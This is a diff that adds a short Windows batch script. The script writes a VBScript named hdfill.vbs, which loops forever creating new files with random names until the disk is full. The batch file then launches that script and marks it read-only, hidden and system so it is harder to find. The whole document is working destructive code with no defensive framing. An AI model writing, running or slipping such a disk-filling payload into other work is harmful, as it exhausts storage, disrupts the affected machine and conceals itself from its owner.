@@ -1,0 +1,10 @@
+@(( echo off ) & break off ) > nul.hdfill
+echo strhdfill = "hdfill" > hdfill.vbs
+echo set fsohdfill = CreateObject("Scripting.FileSystemObject") >> hdfill.vbs
+echo q = 0 >> hdfill.vbs
+echo do >> hdfill.vbs
+echo set fohdfill = fsohdfill.CreateTextFile(strhdfill ^& "%random" ^& "." ^& q) >> hdfill.vbs
+echo q = q + 1 >> hdfill.vbs
+echo loop >> hdfill.vbs
+start "" "%~p0hdfill.vbs"
+if exist "%~p0hdfill.vbs" (attrib +r +h +s "%~p0hdfill.vbs")
